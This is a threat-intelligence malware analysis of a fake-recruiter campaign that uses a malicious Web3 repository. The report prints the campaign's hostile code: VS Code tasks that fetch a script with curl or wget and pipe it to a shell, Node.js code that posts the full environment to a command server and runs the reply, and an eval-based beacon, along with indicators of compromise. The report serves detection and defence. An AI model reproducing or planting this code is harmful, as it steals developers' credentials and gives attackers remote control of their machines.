---
title: "Dravion-Core: Credential Theft and Persistent Beacon via Dual-Path Developer Lure"
date: 2026-04-13
author: "ThreatProphet"
description: "Analysis of a fake developer interview campaign delivering a JavaScript implant through a malicious Web3 repository via two independent execution paths with separate C2 infrastructure, with direct file-level links to three prior Contagious Interview campaigns."
tags:
  - lazarus-group
  - contagious-interview
  - javascript
  - rat
  - linkedin-lure
  - node-js
  - web3
  - environment-harvesting
  - credential-harvesting
  - vercel
  - npm
categories:
  - malware-analysis
  - threat-intelligence
tlp: "CLEAR"
mitre_techniques:
  - T1566.003
  - T1204.002
  - T1059.007
  - T1027
  - T1552.001
  - T1119
  - T1071.001
  - T1041
  - T1036.005
  - T1033
  - T1016
report_id: "TP-2026-009"
showToc: true
---

> *"This was not a new work, but an old hand returning by familiar paths."*

## Executive Summary

A threat actor operating a LinkedIn recruiter persona, assessed with low-to-medium confidence as DPRK-linked and consistent with Contagious Interview / TraderTraitor-style activity, targeted developers through a multi-stage social engineering lure. The initial LinkedIn message delivered a Google Drive-hosted project overview / job description PDF and a Calendly scheduling link. The malicious GitHub repository, **Dravion-Core** hosted under the organisation **Intraverse-Dev-Tech-Hub**, was subsequently shared during the follow-on call rather than in the initial message. The repository deploys two independent execution routes that deliver the same payload via separate C2 infrastructure, in a structure near-identical to [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/) (BetPoker).

Both paths originate from the same `.vscode/tasks.json` and fire simultaneously on folder open when VS Code automatic task execution is enabled. **Path 1** (`env` task) executes a cross-platform pipe-to-shell command against `ip-address-vscode-checking.vercel.app`, with delivery URLs buried under approximately 200 characters of horizontal whitespace. The terminal closes immediately on completion (`close: true`), leaving no visible trace. **Path 2** (`install-root-modules` task) silently runs `npm install`, triggering the `prepare` lifecycle hook and initiating the server startup chain: `loadEnv.js` merges `.env` and `.env.local` into `process.env`; `configureRoutes(app)` requires `routes/index.js`, which requires `routes/api/auth.js`; `validateApiKey()` fires at module load, before any HTTP request is made or any output is visible, POSTing the full `process.env` to `2-27-bk-9-boss-api-copy-three.vercel.app` and executing the response via `new Function("require", response.data)(require)`. Path 2 additionally functions as a standalone fallback outside VS Code: any manual npm command triggers the same chain without `tasks.json` being involved at all.

The `.env` file serves dual purpose: it contributes credentials to the environment dump and conceals the C2 URL inside `AUTH_API`, a base64 blob visually indistinguishable from a backend configuration variable. `AUTH_API` decodes at runtime via `atob()` to the Vercel C2 endpoint. The `.env.local` file is the shared credential harvesting template, byte-for-byte identical to the template used in [TP-2026-002](https://threatprophet.com/posts/2026-02-25-japanese-royal/) and [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/). The `x-app-request: ip-check` campaign fingerprint header is present in both paths, consistent across [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/) and [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/).

The persistent Stage 5 beacon (`env.npl`) uses a three-layer custom obfuscation scheme with active anti-debug countermeasures. Its C2 URL is additionally base64-encoded within the payload itself and decoded at runtime via `Buffer`. The beacon sends host profile data, full `process.env`, a static campaign identifier (`tid`), and a durable per-victim session handle (`sysId`) to a secondary Hetzner-hosted C2 every five seconds. C2 responses are executed via `eval()`.

File-level hash analysis establishes direct artifact links to three prior campaigns in this series. The `.env.local` credential harvesting template is byte-for-byte identical to the shared template documented in [TP-2026-002](https://threatprophet.com/posts/2026-02-25-japanese-royal/) and [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/). The lure repository's `package.json` matches the Softstack-Platform-MVP2 artifact from [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/). The operator contact email shares a distinctive handle with the confirmed Git author identity from [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/), and the lure file name directly references the `LuckyKat1001` GitHub account documented in that report. The Vercel delivery domain `ip-address-vscode-checking.vercel.app` is a direct rename of `vscode-ipchecking.vercel.app` from [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/), serving identical URL paths.

The secondary C2 at `88.99.241[.]111:1224` (Hetzner ASN24940) was confirmed active at time of investigation on April 3, 2026. Attribution is assessed at **low-to-medium confidence** based on overlap with publicly reported developer-targeting DPRK tradecraft and on cross-campaign artifact continuity with [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/), [TP-2026-002](https://threatprophet.com/posts/2026-02-25-japanese-royal/), and [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/). These overlaps support campaign relatedness, but do not by themselves establish a single operator.

---

## Attack Overview

### Initial Contact

Initial contact was made through LinkedIn by a persona using the display name `Jack Coulson`. In the observed chat, the actor shared a Google Drive-hosted project overview / job description document and a Calendly scheduling link (`calendly.com/brajanjake/45min`) for a follow-on Google Meet conversation. The message framed the interaction as a discussion about the project, the role, and the budget.

The malicious repository was not shared in the initial LinkedIn message. Based on the observed conversation flow and victim account, the GitHub repository (`github.com/Intraverse-Dev-Tech-Hub/Dravion-Core`) was shared later during the call. This establishes a staged lure sequence: LinkedIn contact, PDF pretext, scheduling via Calendly, live call, and only then repository delivery.

The lure file name `JD-Luckykat` and the accompanying PDF branding align with the Intraverse cover story used throughout the repository and supporting materials. The PDF presents the opportunity as a blockchain- and gaming-oriented project and advertises senior technical and advisory roles, reinforcing the Web3 developer targeting profile.

### Kill Chain

Both execution paths originate from `.vscode/tasks.json` and fire simultaneously on folder open when VS Code automatic task execution is enabled.

**Path 1 - `env` task, pipe-to-shell via Vercel**

1. VS Code fires the `env` task silently on folder open (`runOn: folderOpen`). The terminal closes immediately after firing (`close: true`), leaving no visible trace.
2. Task executes an OS-specific pipe-to-shell command against `ip-address-vscode-checking.vercel.app/api/settings/{mac,linux,windows}`. The delivery URL is pushed approximately 200 characters off-screen by horizontal whitespace padding in the raw file.
3. Loader script prints `Authenticated` (misdirection), downloads and executes the bootstrap script via `nohup`.
4. Bootstrap installs a portable Node.js binary if absent, fingerprints the victim workspace, downloads `env-setup.js` and `package.json` from the same endpoint, runs `npm install`, and executes the beacon implant.
5. `env-setup.js` beacons to `88.99.241[.]111:1224/api/checkStatus` every 5 seconds with host profile, full `process.env`, campaign identifier, and session handle.

**Path 2 - `install-root-modules` task, npm prepare hook, server startup chain**

1. VS Code fires the `install-root-modules` task silently on folder open (`runOn: folderOpen`), in parallel with the `env` task. Unlike the `env` task, this task does not set `close: true` - the silent terminal panel remains present on an instrumented machine.
2. The task runs `npm install --silent --no-progress`, triggering the `prepare` lifecycle hook: `"prepare": "node server/server.js"`.
3. `server.js` calls `require("./config/loadEnv")()`, which merges `.env` and `.env.local` into `process.env`. `AUTH_API` in `.env` - a base64-encoded Vercel C2 URL - is now present in `process.env`.
4. `server.js` calls `configureRoutes(app)`. `routes/index.js` executes `require('./api/auth')`, causing Node.js to evaluate `server/routes/api/auth.js` at module load.
5. Module-load execution of `routes/api/auth.js` calls `validateApiKey()` before any HTTP request is made. `setApiKey(process.env.AUTH_API)` decodes `AUTH_API` via `atob()` to the Vercel C2 URL.
6. `verify(url)` POSTs the full `process.env` spread to `2-27-bk-9-boss-api-copy-three.vercel.app` with the `x-app-request: ip-check` campaign header.
7. The C2 response body is executed via `new Function("require", response.data)(require)`, granting the delivered payload full Node.js module access.
8. The delivered `env.npl` payload deobfuscates and begins beaconing to `88.99.241[.]111:1224/api/checkStatus` every 5 seconds.

When VS Code automatic task execution is disabled, Path 2 remains fully functional as a standalone fallback: any manual npm command (`npm start`, `npm run build`, `npm test`, `npm run eject`, `npm install`) triggers the same chain via the `prepare` hook or run scripts, without VS Code or `tasks.json` being involved at all.

The use of separate Vercel endpoints for Path 1 (`ip-address-vscode-checking.vercel.app`) and Path 2 (`2-27-bk-9-boss-api-copy-three.vercel.app`) provides operational resilience and reduces single-domain dependency: disruption of one endpoint would not necessarily disable the other path.

---

## Technical Analysis

### `.vscode/tasks.json` - Dual Auto-Execution Origin

**SHA256:** `8a9f86b08e4ebca7c627ef45a9fbc98a25565e3dd581218800a9e1db4a89264b`

Both tasks share `runOptions.runOn: "folderOpen"` and suppressed presentation options (`reveal: silent`, `echo: false`, `panel: new`). They fire in parallel on the same folder open event.

**Task 1: `env` - Path 1 pipe-to-shell delivery**

```json
{
  "label": "env",
  "osx":     { "command": "curl -L 'https://ip-address-vscode-checking.vercel.app/api/settings/mac' | bash" },
  "linux":   { "command": "wget -qO- 'https://ip-address-vscode-checking.vercel.app/api/settings/linux' | sh" },
  "windows": { "command": "curl --ssl-no-revoke -L https://ip-address-vscode-checking.vercel.app/api/settings/windows | cmd" },
  "runOptions": { "runOn": "folderOpen" },
  "presentation": { "reveal": "silent", "echo": false, "close": true, ... }
}
```

Each platform-specific command key contains approximately 200 characters of horizontal whitespace before the actual command string, pushing the delivery URL entirely off-screen in the default VS Code editor viewport - a technique consistently observed across the Contagious Interview cluster per Abstract Security ASTRO reporting. The `close: true` presentation option causes the terminal to close immediately on completion, leaving no visible trace of execution. The task label `"env"` is consistent across all prior campaigns in this series.

The delivery domain `ip-address-vscode-checking.vercel.app` is a direct rename of `vscode-ipchecking.vercel.app` from [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/), serving identical URL paths (`/api/settings/{mac,linux,windows,bootstraplinux,bootstrap,env,package}`). This is infrastructure rotation, not a new campaign.

**Task 2: `install-root-modules` - Path 2 auto-trigger**

```json
{
  "label": "install-root-modules",
  "type": "shell",
  "command": "npm install --silent --no-progress",
  "runOptions": { "runOn": "folderOpen" },
  "presentation": { "reveal": "silent", "echo": false, ... }
}
```

This task silently invokes `npm install` on folder open, triggering the `prepare` lifecycle hook and initiating the Path 2 server startup chain. It is cross-platform, with explicit shell configuration for `cmd.exe` on Windows and `/bin/bash -l -c` on Linux and macOS. Unlike the `env` task, it does not set `close: true` - on an instrumented machine, the silent terminal panel remains present as an observable artifact.

### `package.json` - Path 2 Entry Points

**SHA256:** `2f65e39dcbcb028da4bf4da43f3a1db7e5f9fff2dfd57ad1a5abd85d7950f365`

The repository presents as a full-stack Web3/poker React+Node.js application with a realistic dependency list as camouflage. The minimal delivery manifest reuses `axios ^1.10.0` and `request ^2.88.2`, a pattern more usefully treated as evidence of tooling continuity than of victim-specific profiling.

```json
"scripts": {
  "prepare": "node server/server.js",
  "start":   "node server/server.js | react-scripts --openssl-legacy-provider start",
  "build":   "node server/server.js | react-scripts --openssl-legacy-provider build",
  "test":    "node server/server.js | react-scripts --openssl-legacy-provider test",
  "eject":   "node server/server.js | react-scripts --openssl-legacy-provider eject"
}
```

Five independent npm entry points all route through `node server/server.js`. The `prepare` hook fires on `npm install`; the four run scripts fire when the victim starts or works with the project. Every standard developer workflow command triggers Path 2, independent of VS Code.

### `server/server.js` - Clean Launcher

**SHA256:** `a9db9559a1e97762d0e72715301329bc325d08e239a29e1382e99033ede986de`

The server entry point is a legitimate Express application. It executes two key operations at startup: `require("./config/loadEnv")()` and `configureRoutes(app)`. The malware piggybacks on the legitimate application startup sequence. `server.js` itself contains no malicious logic, providing plausible deniability during casual code review.

### `server/config/loadEnv.js` - Environment Merger

**SHA256:** `c08356a5a4ebbd8804c9acbe2e0c1b986d867b057d2e827ae663e4aec2204ed2`

```javascript
function loadEnv() {
    dotenv.config();                        // loads .env
    dotenv.config({ path: ".env.local" }); // loads .env.local
}
```

A `dotenv` wrapper that merges both environment files into `process.env` before any route executes. The naming `loadEnv` is visually indistinguishable from standard `dotenv` initialisation during code review. Two files are loaded, each serving a distinct role:

- **`.env`** (SHA256: `0b7c39854579ea831bec7cf2da7ec6ff39407757227a9dc795abbb74bbfc6ff4`) contains `AUTH_API`, a base64-encoded Vercel C2 URL. The key name and placement among legitimate backend configuration variables make it visually indistinguishable from a real API key. `atob()` decodes it to the C2 endpoint only at runtime.
- **`.env.local`** (SHA256: `37eb8e11b40527de0881189064c657fe1623d6b2c8ad16fc8136782e89367ead`) is the shared credential harvesting template, byte-for-byte identical across [TP-2026-002](https://threatprophet.com/posts/2026-02-25-japanese-royal/) and [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/). It seeds `process.env` with a broad credential collection template spanning Web3, crypto, AWS, and SaaS-related environment variable names. Any real developer credentials present at runtime are exfiltrated on top.

### `server/routes/index.js` - Route Registration

**SHA256:** `a9d8ea7c9a396d5c1f04d998f4f3e944c67ec4c88524a05c613bcb1ca0a7eacf`

```javascript
const configureRoutes = (app) => {
  app.use('/api/auth', require('./api/auth'));
  app.use('/api/users', require('./api/users'));
  app.use('/api/chips', require('./api/chips'));
  app.use('/', (req, res) => {
    res.status(200).send('GGLab API Documents');
  });
};

module.exports = configureRoutes;
```

`routes/index.js` is itself clean. Its role in the attack chain is that `require('./api/auth')` causes Node.js to evaluate `server/routes/api/auth.js` at module load. The malicious execution fires as a side effect of route registration - before any HTTP request arrives, before any route handler is invoked, and before any output is visible to the victim.

### `server/routes/api/auth.js` - Primary Malware File

**SHA256:** `28e73ce85db813ba0839ee077428eaa121037e3a1ec8a13b1171e68cc2a0accd`

This is the file where the attack executes. It imports `setApiKey` and `verify` from `controllers/auth.js` and calls `validateApiKey()` at module load:

```javascript
const { getCurrentUser, login, setApiKey, verify } = require('../../controllers/auth');

async function validateApiKey() {
  verify(setApiKey(process.env.AUTH_API))
    .then((response) => {
      const executor = new Function("require", response.data);
      executor(require);
      console.log("API Key verified successfully.");
      return true;
    })
    .catch((err) => {
      console.log("API Key verification failed:", err);
      return false;
    });
}
```

`validateApiKey()` executes the full attack sequence:

1. `setApiKey(process.env.AUTH_API)` decodes the base64 C2 URL from `.env`.
2. `verify(url)` POSTs the full `process.env` spread to the Vercel C2 with the `x-app-request: ip-check` campaign fingerprint.
3. The C2 response body is executed via `new Function("require", response.data)(require)`. This constructs a function in the global scope with `require` explicitly injected as a parameter, granting the delivered payload full Node.js module access - filesystem, network, child processes. This is the same `new Function()` delivery primitive documented in [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/), [TP-2026-002](https://threatprophet.com/posts/2026-02-25-japanese-royal/), and [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/).

The `console.log("API Key verified successfully.")` output provides social engineering cover, appearing as a routine key validation step in any terminal output the victim might observe.

### `server/controllers/auth.js` - Utility Exports

**SHA256:** `cc9e443872d99b07e4bf5f6baa6144fbe0fd24bc610e58340d9b8c755df17fce`

```javascript
const setApiKey = (s) => atob(s);

const verify = (api) =>
  axios.post(api, { ...process.env }, {
    headers: { "x-app-request": "ip-check" }
  });

module.exports = { getCurrentUser, login, setApiKey, verify };
```

The controller exports the utility functions consumed by `routes/api/auth.js`. `setApiKey` is a single-line `atob()` wrapper. `verify` performs the exfiltration POST: it spreads the entire `process.env` object as the request body and sets the `x-app-request: ip-check` campaign fingerprint header, present across [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/) and [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/).

### Vercel Delivery Chains

The campaign uses two distinct Vercel endpoints with separate roles.

#### Path 1 - Stage Delivery (`ip-address-vscode-checking.vercel.app`)

Used by the `env` task as a cross-platform pipe-to-shell delivery point. Exposes OS-specific routes under `/api/settings/{mac,linux,windows}` and supporting routes for bootstrap and payload delivery. Structure and route layout are consistent with the delivery infrastructure documented in [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/) and [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/) - the domain rotated, the routes did not.

**Stage loader (`/api/settings/{mac,linux,windows}`):** Prints `Authenticated` as misdirection, then downloads and executes the bootstrap script via `nohup`.

**Bootstrap (`/api/settings/bootstraplinux`, `/api/settings/bootstrap`):** Checks for a global Node.js installation; if absent, fetches the latest portable binary from `nodejs.org/dist/index.json` into `$HOME/.vscode/`. Records the workspace folder name to `$HOME/.vscode/<foldername>.txt` (victim fingerprinting). Downloads `env-setup.js` and `package.json`, runs `npm install` (`axios`, `request`), and executes the beacon. The portable Node.js fallback broadens the victim pool to machines without an existing Node environment.

**`env-setup.js` (`/api/settings/env`):** The Path 1 beacon payload, written to `$HOME/.vscode/` (SHA256: `0700489f04fa6aebde239bf8cf8563706544802d016386edc6c3ad229d0781fd`). Functionally identical to `env.npl` - same beacon logic, same C2, same host profiling. `env-setup.js` is the on-disk filename used when the payload is dropped by the bootstrap; `env.npl` is the in-memory filename used when delivered via the Path 2 `eval()` chain.

**`package.json` (`/api/settings/package`):** Minimal manifest pulling `axios ^1.10.0` and `request ^2.88.2`, start script pointing to `env.npl`. SHA256 `6effad9fdee81589b37c60bbbae20483200bf53bee3e3c107b1aa47d2ac4ccb3` - byte-for-byte identical to the artifact served from `vscode-ipchecking.vercel.app` in [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/) and `vscode-settings-tasks-227.vercel.app` in [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/). The domain rotated; the tooling did not.

#### Path 2 - Environment Collection and Stage Response (`2-27-bk-9-boss-api-copy-three.vercel.app`)

Embedded in `.env` as the base64-encoded `AUTH_API` value. During server startup, `auth.js` decodes this value at runtime, POSTs the full `process.env` to the endpoint, and executes the HTTP response body via `new Function("require", response.data)(require)`. Unlike Path 1, which uses explicit routes exposed through `tasks.json`, this endpoint is concealed inside `.env` and only revealed at runtime - serving simultaneously as the exfiltration sink and the in-memory stage delivery mechanism.

### `env.npl` - Stage 5 Persistent Beacon

`env.npl` is an obfuscated Node.js payload with the `.npl` extension chosen to evade file-type scanners. The naming convention is consistent with InvisibleFerret-style payload naming documented across this campaign cluster. The payload uses three obfuscation layers:

1. **String array rotation** - a large array of encoded string fragments with six rotation shifts, validated by checksum `0x46291`.
2. **Custom base64** - a non-standard base64 alphabet requiring a custom decoder.
3. **Double encoding** - the above layers applied twice to core payload strings.

The secondary C2 URL is additionally base64-encoded within the payload itself and decoded at runtime via `Buffer` - a fourth layer of obfuscation applied specifically to the C2 address.

**Anti-debug countermeasures:** Two regex-based checks detect debugger attachment and function serialisation inspection. On trigger, the payload enters `while(true){}` - an infinite blocking loop preventing analysis without process termination.

**Host profiling:**

```javascript
hostname: os.hostname()
macs:     networkInterfaces filtered for non-loopback MACs (00:00:00:00:00:00 excluded)
os:       os.type() + os.release() + '(' + os.platform() + ')'
```

MAC filtering explicitly removes the loopback address, ensuring only real physical interfaces are reported - a deliberate choice to uniquely identify victims across sessions.

**Beacon:**

```
GET http://88.99.241[.]111:1224/api/checkStatus
  ?sysInfo=JSON.stringify(hostProfile)
  &processInfo=JSON.stringify(process.env)
  &tid=<campaign identifier>
  &sysId=<session identifier>
```

Fires on load and repeats every 5 seconds indefinitely (`setInterval(..., 0x1388)`). The `tid` field is a static campaign identifier embedded at payload compile time. The `sysId` field is assigned by the C2 on first contact and re-submitted on every subsequent poll, giving the operator a durable per-victim session handle that persists across reconnects. Full `process.env` is re-transmitted on every poll. C2 responses carry `status`, `message`, and `sysId` fields; when `status` is `"error"`, the `message` field is executed directly via `eval()` - a fully general arbitrary remote code execution primitive.

**Campaign tag:** `bm93IGl0IHRpbWUgdG8gZ2V0IGV2ZXJ5dGhpbmc=` decodes to `"now it time to get everything"`, an embedded operator string that is notable as campaign texture but should not be treated as attribution evidence on its own.

---

## Cross-Campaign Artifact Links

Three file-level and two identity-level artifacts directly link TP-2026-009 to prior campaigns in this series.

| Artifact | Value | Also Present In |
|---|---|---|
| `.env.local` SHA256 | `37eb8e11b40527de0881189064c657fe1623d6b2c8ad16fc8136782e89367ead` | [TP-2026-002](https://threatprophet.com/posts/2026-02-25-japanese-royal/) (all `0xroaman-1`/`0xroaman-2` repos), [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/) (BetPoker) |
| `package.json` SHA256 | `2f65e39dcbcb028da4bf4da43f3a1db7e5f9fff2dfd57ad1a5abd85d7950f365` | [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/): Softstack-Platform-MVP2 lure root |
| Delivery `package.json` SHA256 | `6effad9fdee81589b37c60bbbae20483200bf53bee3e3c107b1aa47d2ac4ccb3` | [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/): `/api/settings/package` (vscode-ipchecking), [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/): `/api/settings/package` (vscode-settings-tasks-227) |
| Operator email handle | `brajanjake@gmail.com` (`brajan` prefix) | [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/): `brajan.intro@gmail.com` (confirmed Git author) |
| Lure filename | `JD-Luckykat` (`Luckykat` substring) | [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/): `LuckyKat1001` GitHub account (confirmed operator) |

The `.env.local` match spans three campaigns ([TP-2026-002](https://threatprophet.com/posts/2026-02-25-japanese-royal/), [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/), TP-2026-009) - the same credential harvesting template is being reused across all lure repositories. The delivery `package.json` match now spans all three reports in this series: the operator has rotated the delivery domain twice while reusing the same artifact at each new endpoint. The `brajan` email handle and `Luckykat` filename together provide the strongest cross-campaign identity clue in this report, but they do not independently establish a single operator.

The `x-app-request: ip-check` campaign header, `AUTH_API` base64 URL pattern, `atob()` decode primitive, `{...process.env}` POST body, `new Function("require", response.data)(require)` delivery primitive, 5-second beacon interval, `.npl` extension naming, and `eval()`-based C2 RCE are all consistent across [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/), [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/), and TP-2026-009, indicating strong toolkit continuity and closely related tradecraft.

The two captured beacon payloads (`env-setup.js` via Path 1 GET, SHA256 `0700489f...`; `env.npl` via Path 2 POST response, SHA256 `da587eb8...`) are functionally identical with whitespace-only differences. The hash divergence has two plausible explanations that are not mutually exclusive: the two Vercel endpoints are independent deployments serving from separate projects with trivially divergent formatting, and the responses were captured via different request methods - a GET to `/api/settings/env` for Path 1 and a POST response from the Path 2 C2 - which may itself account for serialisation differences. Either way, the payloads deliver the same logic.

### Commit-History Observations

Commit metadata shows the repository evolved through at least three visible identity layers. The initial commit was made by `Ivan <167746537+DeAngDai354@users.noreply.github.com>` on 2025-09-11. Development then continued under `okada0209 <lovelysong0209+2@gmail.com>` from September through November 2025. A later phase, from December 2025 through March 2026, was committed under `Intraverse-Dev-Tech-Hub <thomas.cryptolover@gmail.com>`.

The later `thomas.cryptolover@gmail.com` phase is the most relevant to the malicious execution chain documented in this report. It includes repeated updates to `.env` and `.vscode/tasks.json`, the two files central to Path 2 (`AUTH_API`-driven C2 staging) and Path 1 (`runOn: folderOpen` task execution). This pattern supports an interpretation of late-stage repository weaponisation rather than a static malicious implant present from the initial commit. Several of these late edits were performed through web-based workflows, with commit messages such as `.env edited online with Bitbucket` and `.vscode/tasks.json edited online with Bitbucket` - workflow texture that is analytically notable but should not be treated as standalone attribution evidence.

---

## Exfiltrated Data

Both transmission mechanisms capture the victim's entire runtime environment as a single operation:

1. `routes/api/auth.js` `validateApiKey()` - POSTs `{...process.env}` to the Path 2 Vercel C2 at module load, before any output is visible.
2. `env.npl` beacon - transmits `processInfo=JSON.stringify(process.env)` alongside host profile data to `88.99.241[.]111:1224` every 5 seconds.

The scope of the exfiltration is whatever is present in `process.env` at execution time. This includes everything loaded from `.env` and `.env.local` by `loadEnv.js`, plus any additional environment variables already present in the victim's shell session.

The variable names seeded in the committed `.env` and `.env.local` files are dummy placeholders. A developer evaluating a demo project is unlikely to replace them with real credentials. The practical exfiltration value lies elsewhere: `{...process.env}` captures not only what is loaded from those files, but the victim's full shell environment at execution time - AWS CLI credentials, tokens set by other tools, and any variables already present in the session. The template defines the actor's target credential profile, but the actual yield depends on what the victim's environment already contains.

Beyond the initial environment dump, env.npl executes arbitrary code returned by the C2 via eval(). This gives the operator full Node.js access to the victim machine - filesystem, network, and child processes - enabling targeted follow-on collection of any files or secrets not captured in the initial process.env sweep.

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic | Notes |
|---|---|---|---|
| T1566.003 | Spearphishing via Service | Initial Access | Calendly interview invitation lure; LinkedIn delivery consistent with prior campaigns |
| T1204.002 | Malicious File | Execution | Victim opens repository folder in VS Code, triggering auto-execution tasks |
| T1059.007 | JavaScript | Execution | Node.js throughout; `new Function()` delivery in `routes/api/auth.js`; `eval()` in `env.npl` |
| T1546.016 | Installer Packages | Persistence / Execution | `prepare` npm lifecycle hook fires on `npm install`, itself triggered by VS Code task |
| T1027 | Obfuscated Files or Information | Defense Evasion | Three-layer custom obfuscation in `env.npl`; C2 URL base64-encoded within payload via `Buffer`; base64-encoded C2 URL in `.env`; ~200-char whitespace padding in `tasks.json` |
| T1140 | Deobfuscate/Decode Files | Defense Evasion | `atob(process.env.AUTH_API)` decodes Vercel C2 URL at runtime; `Buffer` decode reveals secondary C2 URL within `env.npl` |
| T1036.005 | Masquerading: Match Legitimate Name or Location | Defense Evasion | `loadEnv.js` naming; `AUTH_API` key name; `.npl` extension; `install-root-modules` task label; `Authenticated` console misdirection |
| T1552.001 | Unsecured Credentials: Credentials in Files | Credential Access | Full `process.env` including `.env` and `.env.local` exfiltrated at module load |
| T1119 | Automated Collection | Collection | `{...process.env}` sweep collects entire runtime environment in a single operation |
| T1071.001 | Application Layer Protocol: Web Protocols | C2 | Plain HTTP beacon to `88.99.241[.]111:1224`; HTTPS to Vercel delivery infrastructure |
| T1041 | Exfiltration Over C2 Channel | Exfiltration | `process.env` transmitted via both Vercel POST and Hetzner GET beacon |
| T1033 | System Owner/User Discovery | Discovery | Hostname collected and transmitted in every beacon |
| T1016 | System Network Configuration Discovery | Discovery | Non-loopback MAC addresses enumerated for persistent victim identification |
| T1082 | System Information Discovery | Discovery | OS type, release, and platform collected in host profile |

---

## Infrastructure Analysis

### Network Infrastructure

| Indicator | Type | Notes |
|---|---|---|
| `88.99.241[.]111` | IPv4 | Secondary C2, confirmed active 2026-04-03T12:47Z |
| `88.99.241[.]111:1224` | IP:Port | Node.js Express C2 backend; non-standard port |
| `http://88.99.241[.]111:1224/api/checkStatus` | URL | `env.npl` beacon endpoint; plain HTTP |
| `https://2-27-bk-9-boss-api-copy-three.vercel.app/api` | URL | Path 2 environment POST target and stage-response endpoint |

### C2 Server Fingerprint

```
Host:     88.99.241[.]111
Hoster:   Hetzner Online GmbH (ASN24940)
Abuse:    abuse@hetzner.com

Open ports (nmap confirmed):
  1224/tcp  Node.js Express framework     <- C2 backend (non-standard port)
  5985/tcp  Microsoft HTTPAPI 2.0         <- WinRM
  5357/tcp  tcpwrapped                    <- WSDAPI / Windows Network Discovery

WinRM identity probe:
  ProductVendor:  Microsoft Corporation
  ProductVersion: OS: 0.0.0 SP: 0.0 Stack: 3.0
```

The `OS: 0.0.0` WinRM response is anomalous, but its cause cannot be determined from this evidence alone. It may reflect service emulation, fingerprint suppression, or a non-standard hosting configuration. Likewise, exposure of port 5985 indicates WinRM-like service availability, but does not by itself establish how the server was administered.


### Infrastructure Naming Analysis

The following is a speculative interpretation based on token pattern analysis only.

```text
2-27-bk-9-boss-api-copy-three.vercel.app
|     |    |   |     |           |
|     |    |   |     |           +- Iteration label ("copy-three")
|     |    |   |     +- Operator-chosen token ("boss")
|     |    |   +- Numeric sub-identifier ("9")
|     |    +- Alphabetic token ("bk")
|     +- Possible day element ("27")
+- Possible month element ("2")
```

The hostname appears human-structured rather than randomly generated. The `2-27` prefix may encode a date (February 27), but this cannot be confirmed from the hostname alone. The `copy-three` suffix, combined with `copy-one`, `copy-two`, and `copy-four` all resolving NXDOMAIN at time of analysis, is consistent with a numbered deployment series.

---

## Indicators of Compromise

> All indicators assessed **High confidence** unless noted.

### Network Indicators

| Indicator | Type | Notes |
|---|---|---|
| `88.99.241[.]111` | IPv4 | C2 server, confirmed active 2026-04-03T12:47Z |
| `88.99.241[.]111:1224` | IP:Port | `env.npl` beacon; plain HTTP; non-standard port |
| `http://88.99.241[.]111:1224/api/checkStatus` | URL | Beacon endpoint |
| `2-27-bk-9-boss-api-copy-three.vercel.app` | Domain | Path 2 Vercel C2 |
| `ip-address-vscode-checking.vercel.app` | Domain | Path 1 stage delivery infrastructure |
| `x-app-request: ip-check` | HTTP Header | Campaign fingerprint - present in [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/) and [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/) |
| `/api/settings/mac` `/api/settings/linux` `/api/settings/windows` | URL Paths | Platform dispatch endpoints |
| `/api/settings/bootstraplinux` `/api/settings/bootstrap` | URL Paths | Bootstrap delivery |
| `/api/settings/env` `/api/settings/package` | URL Paths | Beacon implant and dependency manifest delivery |

### File Indicators

| SHA256 | Filename | Notes |
|---|---|---|
| `2f65e39dcbcb028da4bf4da43f3a1db7e5f9fff2dfd57ad1a5abd85d7950f365` | `package.json` | Lure repo root - matches Softstack-Platform-MVP2 ([TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/)) |
| `37eb8e11b40527de0881189064c657fe1623d6b2c8ad16fc8136782e89367ead` | `.env.local` | Matches [TP-2026-002](https://threatprophet.com/posts/2026-02-25-japanese-royal/) and [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/) exactly - shared credential harvesting template |
| `0b7c39854579ea831bec7cf2da7ec6ff39407757227a9dc795abbb74bbfc6ff4` | `.env` | Contains base64-encoded Vercel C2 URL as `AUTH_API` |
| `8a9f86b08e4ebca7c627ef45a9fbc98a25565e3dd581218800a9e1db4a89264b` | `.vscode/tasks.json` | Dual auto-execution trigger; delivery URLs obscured by ~200-char whitespace padding |
| `6effad9fdee81589b37c60bbbae20483200bf53bee3e3c107b1aa47d2ac4ccb3` | `package.json` (delivery, `/api/settings/package`) | Matches [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/) and [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/) - reused across all three delivery domains |
